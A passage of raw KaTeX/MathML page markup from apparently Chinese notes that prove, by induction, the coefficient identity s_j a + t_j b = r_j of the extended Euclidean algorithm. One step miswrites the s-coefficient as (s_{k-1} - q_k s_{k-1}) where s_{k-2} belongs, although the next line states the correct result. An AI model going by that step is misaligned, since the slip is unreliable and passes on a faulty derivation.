mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋))</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8234em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord">&#x2F;</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">⌋</span></span></span></span><br><strong>那么现在只需证明:</strong><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>对</mtext><mi>j</mi><mo>&#x3D;</mo><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mtext>，</mtext><mspace linebreak="newline"></mspace><msub><mi>s</mi><mi>j</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>j</mi></msub><mi>b</mi><mo>&#x3D;</mo><msub><mi>r</mi><mi>j</mi></msub><mo separator="true">,</mo><mtext>其中</mtext><msub><mi>r</mi><mi>j</mi></msub><mo>&#x3D;</mo><msub><mi>r</mi><mrow><mi>j</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>j</mi></msub><msub><mi>r</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">对j&#x3D;-2,-1,0,1,…,n-1，\newline<br>s_ja+t_jb&#x3D;r_j,其中r_j&#x3D;r_{j-2}-q_jr_{j-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">对</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">−</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">…</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">其中</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span><br><strong>数学归纳法:</strong><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>假设上式对于</mtext><mo separator="true">,</mo><mo>−</mo><mn>2</mn><mo>≤</mo><mi>j</mi><mo>≤</mo><mi>k</mi><mo>−</mo><mn>1</mn><mtext>成立</mtext><mo separator="true">,</mo><mtext>即</mtext><mspace linebreak="newline"></mspace><msub><mi>s</mi><mi>j</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>j</mi></msub><mi>b</mi><mo>&#x3D;</mo><msub><mi>r</mi><mi>j</mi></msub><mspace linebreak="newline"></mspace><mtext>对于</mtext><mi>j</mi><mo>&#x3D;</mo><mi>k</mi><mtext>，有</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><msub><mi>r</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><msub><mi>r</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mspace linebreak="newline"></mspace><mtext> 利用归纳假设，得到</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mi>b</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>b</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><msub><mi>s</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mi>a</mi><mo>+</mo><mo stretchy="false">(</mo><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>k</mi></msub><msub><mi>t</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mi>b</mi><mspace linebreak="newline"></mspace><msub><mi>r</mi><mi>k</mi></msub><mo>&#x3D;</mo><msub><mi>s</mi><mi>k</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>k</mi></msub><mi>b</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex"> 假设上式对于,-2\leq j\leq k-1成立,即\newline<br>s_ja+t_jb&#x3D;r_j\newline<br>对于j&#x3D;k，有:\newline<br>r_k&#x3D;r_{k-2}-q_kr_{k-1}\newline<br>利用归纳假设，得到:\newline<br>r_k&#x3D;(s_{k-2}a+t_{k-2}b)-q_k(s_{k-1}a+t_{k-1}b)\newline<br>r_k&#x3D;(s_{k-1}-q_ks_{k-1})a+(t_{k-2}-q_kt_{k-1})b\newline<br>r_k&#x3D;s_ka+t_kb\newline</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">假设上式对于</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord cjk_fallback">成立</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">即</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">对于</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">，有</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 